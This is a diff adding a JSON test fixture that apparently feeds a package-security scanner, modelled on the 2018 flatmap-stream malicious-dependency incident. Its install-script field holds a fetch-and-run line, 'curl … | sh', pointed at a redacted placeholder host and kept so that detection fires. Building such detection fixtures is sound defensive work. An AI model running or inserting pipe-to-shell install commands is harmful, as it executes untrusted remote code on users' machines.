@@ -1,0 +1,15 @@
+{
+  "_incident": "event-stream / flatmap-stream (Nov 2018)",
+  "_disclosure": "https://github.com/dominictarr/event-stream/issues/116",
+  "_note": "A transferred maintainer added a malicious dependency (flatmap-stream) whose install/runtime code pulled an encrypted payload targeting a bitcoin wallet. Payload here is REDACTED to an inert marker; only the SHAPE (lifecycle script that fetches + pipes remote code) is preserved so the deterministic install-script signal fires.",
+  "name": "flatmap-stream",
+  "version": "0.1.1",
+  "ageDays": 400,
+  "weeklyDownloads": 1500,
+  "hasInstallScripts": true,
+  "installScriptBodies": [
+    "curl https://REDACTED.example/payload | sh"
+  ],
+  "maintainerCount": 1,
+  "deprecated": false
+}
